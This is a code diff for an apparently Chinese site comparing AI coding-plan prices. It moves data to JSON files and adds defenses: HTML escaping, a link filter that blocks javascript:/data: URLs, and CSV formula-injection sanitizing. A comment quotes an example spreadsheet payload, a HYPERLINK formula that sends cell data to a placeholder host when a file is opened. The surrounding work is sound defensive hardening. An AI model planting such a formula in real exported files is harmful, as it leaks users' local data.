@@ -13,9 +13,12 @@
  *   8. 信息源与白嫖板块  —— renderPromos() / renderFreebies() / renderSignals() / renderSourceHealth()
  *        数据分别来自 data/promos.json（人工确认 + 每日自动过期归档）、data/freebies.json（每日来源页核对）、
  *        data/signals.json（机器发现的线索）、data/sourcehealth.json（每源抓取成败，失效会如实标注）
- * 数据均来自 js/data.js 与 js/snapshot.js；页面结构见 index.html。
+ * 数据均来自 data/*.json（plans / calc-plans / calc-models / ide-plans / changelog / repos /
+ * snapshot / price-history / meta / promos / freebies / signals / sourcehealth / alerts）；
+ * 页面结构见 index.html。数据为纯 JSON，浏览器与 Node 巡检脚本读同一份来源。
  * ============================================================ */
 const MODELS_DEV_API = "https://models.dev/api.json";
+const MODELS_TIMEOUT_MS = 5000; // 第三方 API 超过 5s 即视为不可用，直接降级到内置快照
 const CACHE_KEY = "cp_modelsdev_cache_v1";
 const CACHE_TTL = 24 * 3600 * 1000; // 24h
 // 第一方 API 价供应商（排除 *-coding-plan 等 $0 订阅条目）
@@ -33,6 +36,46 @@ let modelRows=[]; // {p,pid,id,n,i,o,c,t,r}
 let compareSelection=[]; // 多选对比选中项（item 9）
 let currentLang="zh"; // 当前语言（item 10）
 let priceHistory={}; // 价格历史缓存（data/price-history.json）
+
+/* ================= 数据容器与加载 =================
+ * 数据统一放在 data/*.json。旧实现把数据写在 js/data.js 里，Node 巡检脚本要靠
+ * `require("../js/data.js")` 执行这个浏览器脚本、再读 globalThis._CP_EXPORT 才能拿到数据
+ * （因为 JS 对象字面量的键名不带引号，无法直接 JSON.parse）。那个 hack 很脆：该文件只要
+ * 引入任何 ESM 语法，require 就会抛错，直接打断每日价格历史记录。改成纯 JSON 后，
+ * 浏览器与脚本共用一份来源，Node 侧也不再需要在运行时执行浏览器代码。
+ * 字段含义见 data/plans.json 的 _readme。 */
+let PLAN_DATA=[], CALC_MODELS=[], CALC_PLANS=[], IDE_PLANS=[], CHANGELOG=[], GH_REPOS=[];
+let MODEL_SNAPSHOT=[], SNAPSHOT_DATE="";
+
+// 单个数据文件读失败只让对应板块为空，不拖垮整页渲染
+async function loadJSONOr(pathname, fallback){
+  try{ return await fetchJSON(pathname); }
+  catch(e){ console.warn(`[data] ${pathname} 加载失败：${e.message}`); return fallback; }
+}
+async function loadData(){
+  const [plans, calcModels, calcPlans, ide, clog, repos] = await Promise.all([
+    loadJSONOr("data/plans.json", {plans:[]}),
+    loadJSONOr("data/calc-models.json", []),
+    loadJSONOr("data/calc-plans.json", []),
+    loadJSONOr("data/ide-plans.json", []),
+    loadJSONOr("data/changelog.json", []),
+    loadJSONOr("data/repos.json", []),
+  ]);
+  PLAN_DATA=plans.plans||[];
+  CALC_MODELS=calcModels; CALC_PLANS=calcPlans; IDE_PLANS=ide; CHANGELOG=clog; GH_REPOS=repos;
+}
+// 兜底快照只在 models.dev 失败时才用得上，因此延迟到降级那一刻再取，正常访问不多发请求
+let snapshotPromise=null;
+function loadSnapshot(){
+  if(!snapshotPromise){
+    snapshotPromise=loadJSONOr("data/snapshot.json", {models:[]}).then(j=>{
+      MODEL_SNAPSHOT=Array.isArray(j.models)?j.models:[];
+      SNAPSHOT_DATE=j.generatedAt||"";
+      return MODEL_SNAPSHOT;
+    });
+  }
+  return snapshotPromise;
+}
 
 /* ================= URL 状态持久化（item 11） ================= */
 function syncURLState(){
@@ -206,19 +249,19 @@ function renderPlans(){
       ?'<span class="srcbadge src-official">'+t("official")+'</span>'
       :'<span class="srcbadge src-agg">'+t("agg")+'</span>';
     const ratio=d.ratio
-      ?`<span class="ratio">${d.ratio}×<small>${d.ratioTier}</small></span>`
+      ?`<span class="ratio">${esc(d.ratio)}×<small>${esc(d.ratioTier)}</small></span>`
       :`<span class="ratio" style="color:var(--dim)">—<small>${currentLang==="en"?"No data":"暂无折算数据"}</small></span>`;
-    const speed=d.speed?`<span class="speedb">⚡ ≈${d.speed} TPS</span>`:"";
+    const speed=d.speed?`<span class="speedb">⚡ ≈${esc(d.speed)} TPS</span>`:"";
     const checked=compareSelection.includes(d.name)?"checked":"";
     return `<tr>
-      <td><input type="checkbox" class="compare-chk" data-name="${d.name}" ${checked} aria-label="${t("compareBtn")} ${d.name}"></td>
-      <td class="p-name">${d.name}<small>${d.vendor} · ${regionTag}</small>${speed}</td>
-      <td class="price">${d.start}</td>
+      <td><input type="checkbox" class="compare-chk" data-name="${esc(d.name)}" ${checked} aria-label="${t("compareBtn")} ${esc(d.name)}"></td>
+      <td class="p-name">${esc(d.name)}<small>${esc(d.vendor)} · ${regionTag}</small>${speed}</td>
+      <td class="price">${esc(d.start)}</td>
       <td>${ratio}</td>
-      <td class="models">${d.models}</td>
-      <td class="quota">${d.quota}</td>
+      <td class="models">${esc(d.models)}</td>
+      <td class="quota">${esc(d.quota)}</td>
       <td><span class="badge ${cls}">${label}</span></td>
-      <td class="src">${srcType}<br><a href="${d.srcUrl}" target="_blank">${currentLang==="en"?"Source ↗":"来源链接 ↗"}</a></td>
+      <td class="src">${srcType}<br><a href="${safeHref(d.srcUrl)}" target="_blank">${currentLang==="en"?"Source ↗":"来源链接 ↗"}</a></td>
     </tr>`;
   }).join("");
   // 绑定对比复选框事件
@@ -305,25 +348,25 @@ function renderCards(){
     const srcType=d.srcType==="official"
       ?'<span class="srcbadge src-official">官方直采</span>'
       :'<span class="srcbadge src-agg">聚合参考</span>';
-    const ratioLine=d.ratio?`<div class="kv"><b>额度倍率：</b>${d.ratio}×（${d.ratioTier}，社区折算口径）</div>`:"";
+    const ratioLine=d.ratio?`<div class="kv"><b>额度倍率：</b>${esc(d.ratio)}×（${esc(d.ratioTier)}，社区折算口径）</div>`:"";
     const periods=d.periods?`<div class="periods">
-      <div><b>5 小时额度</b>${d.periods.h5||"—"}</div>
-      <div><b>每周额度</b>${d.periods.wk||d.periods.mo||"—"}</div>
-      <div><b>每月额度</b>${d.periods.mo||"—"}</div>
+      <div><b>5 小时额度</b>${esc(d.periods.h5||"—")}</div>
+      <div><b>每周额度</b>${esc(d.periods.wk||d.periods.mo||"—")}</div>
+      <div><b>每月额度</b>${esc(d.periods.mo||"—")}</div>
     </div>`:"";
-    const speedLine=d.speed?`<div class="kv"><b>实测速度：</b>≈ ${d.speed} TPS（awesome-coding-plan 实测口径）</div>`:"";
+    const speedLine=d.speed?`<div class="kv"><b>实测速度：</b>≈ ${esc(d.speed)} TPS（awesome-coding-plan 实测口径）</div>`:"";
     const trendLine=priceTrendHTML(d.name);
-    const pitfall=d.pitfalls?`<div class="pitfall">⚠ <b>坑点与社区反馈：</b>${d.pitfalls}</div>`:"";
+    const pitfall=d.pitfalls?`<div class="pitfall">⚠ <b>坑点与社区反馈：</b>${esc(d.pitfalls)}</div>`:"";
     return `<div class="card">
-      <div class="head"><h3>${d.name}</h3><span class="badge b-chip">${d.vendor}</span><span class="badge ${cls}">${label}</span></div>
-      <div class="tagline">${d.start} 起 · ${d.region==="intl"?"国际平台":"国内平台"}</div>
-      <div class="tiers">${d.tiers.map(t=>`<div class="t-row"><span class="t-name">${t[0]}</span><span class="t-price">${t[1]}</span>${t[2]?`<span class="t-note">${t[2]}</span>`:""}</div>`).join("")}</div>
-      <div class="kv"><b>核心模型：</b>${d.models}</div>
-      <div class="kv"><b>额度口径：</b>${d.quota}</div>
+      <div class="head"><h3>${esc(d.name)}</h3><span class="badge b-chip">${esc(d.vendor)}</span><span class="badge ${cls}">${label}</span></div>
+      <div class="tagline">${esc(d.start)} 起 · ${d.region==="intl"?"国际平台":"国内平台"}</div>
+      <div class="tiers">${d.tiers.map(t=>`<div class="t-row"><span class="t-name">${esc(t[0])}</span><span class="t-price">${esc(t[1])}</span>${t[2]?`<span class="t-note">${esc(t[2])}</span>`:""}</div>`).join("")}</div>
+      <div class="kv"><b>核心模型：</b>${esc(d.models)}</div>
+      <div class="kv"><b>额度口径：</b>${esc(d.quota)}</div>
       ${ratioLine}${speedLine}${trendLine}${periods}${pitfall}
-      <div class="tags">${d.tags.map(t=>`<span class="tag2">${t}</span>`).join("")}</div>
-      ${d.note?`<div class="kv" style="color:var(--warn);font-size:12.5px">⚠ ${d.note}</div>`:""}
-      <div class="foot">${srcType}<span>${d.srcNote}</span><a href="${d.srcUrl}" target="_blank">查看来源 ↗</a></div>
+      <div class="tags">${d.tags.map(t=>`<span class="tag2">${esc(t)}</span>`).join("")}</div>
+      ${d.note?`<div class="kv" style="color:var(--warn);font-size:12.5px">⚠ ${esc(d.note)}</div>`:""}
+      <div class="foot">${srcType}<span>${esc(d.srcNote)}</span><a href="${safeHref(d.srcUrl)}" target="_blank">查看来源 ↗</a></div>
     </div>`;
   }).join("");
 }
@@ -331,22 +374,22 @@ function renderCards(){
 function renderRepos(){
   document.getElementById("repos-grid").innerHTML=GH_REPOS.map(r=>`
     <div class="repo">
-      <div class="rt"><h3><a href="${r.url}" target="_blank">${r.name} ↗</a></h3><span class="tag2">${r.tag}</span></div>
-      <p>${r.desc}</p>
-      <div class="meta"><span>${r.stars}</span></div>
+      <div class="rt"><h3><a href="${safeHref(r.url)}" target="_blank">${esc(r.name)} ↗</a></h3><span class="tag2">${esc(r.tag)}</span></div>
+      <p>${esc(r.desc)}</p>
+      <div class="meta"><span>${esc(r.stars)}</span></div>
     </div>`).join("");
 }
 
 function renderIde(){
   document.getElementById("idetbody").innerHTML=IDE_PLANS.map(p=>`
-    <tr><td class="p-name">${p.name}${p.hl?' <span class="badge b-warn">社区推荐</span>':""}</td>
-    <td class="price">${p.price}</td><td class="ratio" style="font-size:14px">${p.ratio}</td>
-    <td class="quota">${p.note}</td></tr>`).join("");
+    <tr><td class="p-name">${esc(p.name)}${p.hl?' <span class="badge b-warn">社区推荐</span>':""}</td>
+    <td class="price">${esc(p.price)}</td><td class="ratio" style="font-size:14px">${esc(p.ratio)}</td>
+    <td class="quota">${esc(p.note)}</td></tr>`).join("");
 }
 
 function renderChangelog(){
   document.getElementById("changelog").innerHTML=CHANGELOG.map(c=>`
-    <div class="cl-item"><span class="cv">${c.v}</span><b>${c.date}</b> — ${c.text}</div>`).join("");
+    <div class="cl-item"><span class="cv">${esc(c.v)}</span><b>${esc(c.date)}</b> — ${esc(c.text)}</div>`).join("");
 }
 
 /* ================= 订阅 vs API 成本计算器 ================= */
@@ -461,7 +504,7 @@ async function loadModels(){
   }catch(e){}
   // 2) 在线拉取
   try{
-    const res=await fetch(MODELS_DEV_API,{cache:"no-cache"});
+    const res=await fetch(MODELS_DEV_API,{cache:"no-cache",signal:AbortSignal.timeout(MODELS_TIMEOUT_MS)});
     if(!res.ok) throw new Error("HTTP "+res.status);
     const api=await res.json();
     modelRows=flattenModels(api);
@@ -469,9 +512,11 @@ async function loadModels(){
     localStorage.setItem(CACHE_KEY,JSON.stringify({ts:Date.now(),rows:modelRows}));
     setStatus("live",`实时数据源：models.dev（GitHub: sst/models.dev）· 拉取成功 ${new Date().toLocaleString("zh-CN")} · ${modelRows.length} 款模型`);
   }catch(err){
-    // 3) 降级到内置快照
-    modelRows=MODEL_SNAPSHOT.map(m=>({...m,t:!!m.t,r:!!m.r}));
-    setStatus("fallback",`在线拉取失败（${err.message}），已降级为内置快照（2026-09-13，${modelRows.length} 款）· 请检查网络后刷新`);
+    // 3) 降级到内置快照（data/snapshot.json，由 Actions 每日重新生成）
+    const snap=await loadSnapshot();
+    modelRows=snap.map(m=>({...m,t:!!m.t,r:!!m.r}));
+    const when=SNAPSHOT_DATE?`快照日期 ${SNAPSHOT_DATE} · `:"";
+    setStatus("fallback",`在线拉取失败（${err.message}），已降级为内置快照（${when}${modelRows.length} 款）· 请检查网络后刷新`);
   }
   renderTokens(); renderCalc();
 }
@@ -491,10 +536,10 @@ function renderTokens(){
   const cheapSet=new Set(rows.slice(0,8).map(r=>JSON.stringify({v:r.pid,m:r.n})));
   const fmtC=c=>c>=1e6?(c/1e6)+"M":c>=1000?Math.round(c/1000)+"K":c;
   tbody.innerHTML=rows.slice(0,80).map(m=>`<tr>
-    <td class="p-name">${m.n}<small>${m.id}</small></td>
-    <td><span class="badge b-chip">${m.p}</span></td>
-    <td class="num">$${m.i}</td>
-    <td class="num ${cheapSet.has(JSON.stringify({v:m.pid,m:m.n}))?"cheap":""}">$${m.o}${cheapSet.has(JSON.stringify({v:m.pid,m:m.n}))?' <span class="spark">⚡性价比</span>':""}</td>
+    <td class="p-name">${esc(m.n)}<small>${esc(m.id)}</small></td>
+    <td><span class="badge b-chip">${esc(m.p)}</span></td>
+    <td class="num">$${esc(m.i)}</td>
+    <td class="num ${cheapSet.has(JSON.stringify({v:m.pid,m:m.n}))?"cheap":""}">$${esc(m.o)}${cheapSet.has(JSON.stringify({v:m.pid,m:m.n}))?' <span class="spark">⚡性价比</span>':""}</td>
     <td class="num">${fmtC(m.c)||"—"}</td>
     <td>${m.t?'<span class="tag2">工具</span> ':""}${m.r?'<span class="tag2">推理</span>':""}</td>
   </tr>`).join("");
@@ -503,6 +548,14 @@ function renderTokens(){
 
 
 /* ================= CSV 导出（item 13） ================= */
+// 公式注入防护：Excel / WPS 会把以 = + - @ 开头的单元格当公式执行，
+// 形如 =HYPERLINK("http://x?"&A1,"点我") 的载荷能在用户打开表格时把本机数据外发。
+// 前置一个单引号让其保持文本；引号与换行仍按 RFC4180 转义。
+const sanitizeCSV = val => {
+  let s=String(val??"").replace(/[\r\n]+/g," ").replace(/"/g,'""');
+  if(/^[=+\-@\t]/.test(s)) s="'"+s;
+  return `"${s}"`;
+};
 function exportCSV(){
   const rows=PLAN_DATA.filter(d=>{
     if(planFilter!=="all" && d.region!==planFilter) return false;
@@ -513,9 +566,9 @@ function exportCSV(){
     return true;
   });
   const header=["平台","厂商","区域","起步价","额度倍率","核心模型","额度口径","状态","数据来源","来源链接"];
-  const lines=[header.join(",")];
+  const lines=[header.map(sanitizeCSV).join(",")];
   for(const d of rows){
-    const line=[d.name,d.vendor,d.region,d.start,d.ratio||"",d.models,d.quota,statusMap[d.status]?statusMap[d.status][1]:d.status,d.srcType,d.srcUrl].map(v=>`"${String(v).replace(/[\r\n]+/g,' ').replace(/"/g,'""')}"`);
+    const line=[d.name,d.vendor,d.region,d.start,d.ratio||"",d.models,d.quota,statusMap[d.status]?statusMap[d.status][1]:d.status,d.srcType,d.srcUrl].map(sanitizeCSV);
     lines.push(line.join(","));
   }
   const blob=new Blob(["\ufeff"+lines.join("\n")],{type:"text/csv;charset=utf-8"});
@@ -573,6 +626,13 @@ function tierBadge(tier){
   return `<span class="srcbadge ${cls}">${label}</span>`;
 }
 const esc = s => String(s??"").replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+// esc() 只处理 &<>" 四个字符，挡不住协议层面的注入（javascript:/data:）。
+// 所有写进 href 的外来链接——RSS 线索、models.dev、人工录入的来源链接——都必须再过这一层：
+// 只放行 http/https，其余一律降级成不可点击的 #，避免点了「查看来源」却执行脚本。
+const safeHref = u => {
+  const s=String(u??"").trim();
+  return /^https?:\/\//i.test(s) ? esc(s) : "#";
+};
 const fetchJSON = async p => (await fetch(p,{cache:"no-cache"})).json();
 
 async function loadAutoMeta(){
@@ -624,7 +684,7 @@ async function renderPromos(){
   const tl=p=>{
     const st=stOf(p.kind);
     const src=p.source&&p.source.url
-      ? `<a href="${esc(p.source.url)}" target="_blank">${esc(p.source.label)}</a>`
+      ? `<a href="${safeHref(p.source.url)}" target="_blank">${esc(p.source.label)}</a>`
       : esc(p.source&&p.source.label||"来源待补");
     const badge=p.expired
       ?'<span class="badge b-expired">已结束</span>'
@@ -639,7 +699,7 @@ async function renderPromos(){
   };
   const sigRow=i=>`<div class="tl-item is-signal">
     <div class="date">${esc(fmtISODate(i.date||i.firstSeen||""))} · 机器线索</div>
-    <h4><a href="${esc(i.url)}" target="_blank">${esc(leadTitle(i))}</a></h4>
+    <h4><a href="${safeHref(i.url)}" target="_blank">${esc(leadTitle(i))}</a></h4>
     ${leadExcerpt(i)?`<p>${esc(leadExcerpt(i))}</p>`:""}
     <div class="src-line">${tierBadge(i.tier)}<span class="badge b-chip">待人工确认</span><span>来源：${esc(i.sourceLabel)}</span></div>
   </div>`;
@@ -691,14 +751,14 @@ async function renderFreebies(){
         <div class="kv"><b>门槛：</b>${esc(f.requires||"—")}</div>
         ${f.note?`<div class="kv">${esc(f.note)}</div>`:""}
         ${f.statusNote?`<div class="kv" style="color:var(--warn)">⚠ ${esc(f.statusNote)}</div>`:""}
-        <div class="foot"><span>${badge}<br>核对 ${esc(checkedDate)} · 证据：${esc(f.evidence||"—")}</span><a href="${esc(f.source)}" target="_blank">查看来源 ↗</a></div>
+        <div class="foot"><span>${badge}<br>核对 ${esc(checkedDate)} · 证据：${esc(f.evidence||"—")}</span><a href="${safeHref(f.source)}" target="_blank">查看来源 ↗</a></div>
       </div>`}).join("");
     const retBox=document.getElementById("freebies-retired");
     const ret=j.retired||[];
     if(retBox) retBox.innerHTML=ret.map(r=>`
       <div class="alert bad"><span class="ico">⛔</span><div>
         <b>${esc(r.name)} 已失效，不要再照着旧教程折腾</b>
-        <small>${esc(r.reason)}${r.source?` · <a href="${esc(r.source)}" target="_blank">官方说明 ↗</a>`:""}</small>
+        <small>${esc(r.reason)}${r.source?` · <a href="${safeHref(r.source)}" target="_blank">官方说明 ↗</a>`:""}</small>
       </div></div>`).join("");
   }catch(e){
     box.innerHTML='<p style="color:var(--dim)">白嫖数据加载失败（data/freebies.json）</p>';
@@ -754,7 +814,7 @@ function leadExcerpt(i){
 function sigRow(s){
   const title=leadTitle(s), excerpt=leadExcerpt(s);
   return `<div class="sig">
-    <div class="sh">${tierBadge(s.tier)}<a href="${esc(s.url)}" target="_blank">${esc(title)}</a></div>
+    <div class="sh">${tierBadge(s.tier)}<a href="${safeHref(s.url)}" target="_blank">${esc(title)}</a></div>
     <div class="sd">${esc(s.sourceLabel)} · 本站发现于 ${esc(s.firstSeen)}${s.date?` · 原文时间 ${esc(fmtISODate(String(s.date).slice(0,16)))}`:""}</div>
     ${excerpt?`<div class="sd">${esc(excerpt)}</div>`:""}
   </div>`;
@@ -811,26 +871,27 @@ async function renderSourceHealth(){
 }
 
 /* ================= init ================= */
-const platCount=PLAN_DATA.filter(d=>d.status!=="bad").length;
-document.getElementById("st-plat").textContent=platCount;
-const platDesc=document.getElementById("st-plat-desc");
-if(platDesc) platDesc.textContent=platCount;
-document.getElementById("st-tier").textContent=PLAN_DATA.reduce((s,d)=>s+d.tiers.length,0);
-loadAutoMeta();
+// 数据在 data/*.json，必须先取回才能渲染；页面骨架（导航、表单、静态文案）不依赖数据，先行绑定，
+// 这样数据失败时筛选/搜索等控件仍可用，且只在数据到位后统一做一次首屏渲染（避免半渲染闪烁）。
 bind();
-// 应用 URL 恢复的状态
-document.querySelectorAll(".chip[data-filter]").forEach(x=>{x.classList.toggle("on",x.dataset.filter===planFilter);x.setAttribute("aria-pressed",x.dataset.filter===planFilter);});
-document.getElementById("search").value=planQuery;
-document.getElementById("sort").value=planSort;
-document.querySelectorAll(".chip[data-tfilter]").forEach(x=>{x.classList.toggle("on",x.dataset.tfilter===tFilter);x.setAttribute("aria-pressed",x.dataset.tfilter===tFilter);});
-const toolBtn=document.querySelector(".chip[data-ttool]"); if(toolBtn){toolBtn.classList.toggle("on",tToolOnly);toolBtn.setAttribute("aria-pressed",tToolOnly);}
-document.getElementById("tsearch").value=tQuery;
-document.getElementById("tsort").value=tSort;
-// 语言按钮：首屏只同步高亮态，等价格历史与实时榜渲染完再整体应用 URL 带来的语言
-document.querySelectorAll(".lang-btn").forEach(b=>b.classList.toggle("on",b.dataset.lang===currentLang));
-// 首屏渲染前同步加载价格历史，消除闪烁
 (async () => {
-  await loadPriceHistory();
+  await Promise.all([loadData(), loadPriceHistory()]);
+  const platCount=PLAN_DATA.filter(d=>d.status!=="bad").length;
+  document.getElementById("st-plat").textContent=platCount;
+  const platDesc=document.getElementById("st-plat-desc");
+  if(platDesc) platDesc.textContent=platCount;
+  document.getElementById("st-tier").textContent=PLAN_DATA.reduce((s,d)=>s+d.tiers.length,0);
+  loadAutoMeta();
+  // 应用 URL 恢复的状态
+  document.querySelectorAll(".chip[data-filter]").forEach(x=>{x.classList.toggle("on",x.dataset.filter===planFilter);x.setAttribute("aria-pressed",x.dataset.filter===planFilter);});
+  document.getElementById("search").value=planQuery;
+  document.getElementById("sort").value=planSort;
+  document.querySelectorAll(".chip[data-tfilter]").forEach(x=>{x.classList.toggle("on",x.dataset.tfilter===tFilter);x.setAttribute("aria-pressed",x.dataset.tfilter===tFilter);});
+  const toolBtn=document.querySelector(".chip[data-ttool]"); if(toolBtn){toolBtn.classList.toggle("on",tToolOnly);toolBtn.setAttribute("aria-pressed",tToolOnly);}
+  document.getElementById("tsearch").value=tQuery;
+  document.getElementById("tsort").value=tSort;
+  // 语言按钮：首屏只同步高亮态，等首屏渲染完再整体应用 URL 带来的语言
+  document.querySelectorAll(".lang-btn").forEach(b=>b.classList.toggle("on",b.dataset.lang===currentLang));
   renderPlans(); renderCards(); renderRepos(); renderIde(); renderChangelog(); renderCalc(); renderCompare(); loadModels();
   if(currentLang!=="zh") setLang(currentLang);
   renderPromos(); renderFreebies(); renderSignals(); renderSourceHealth();
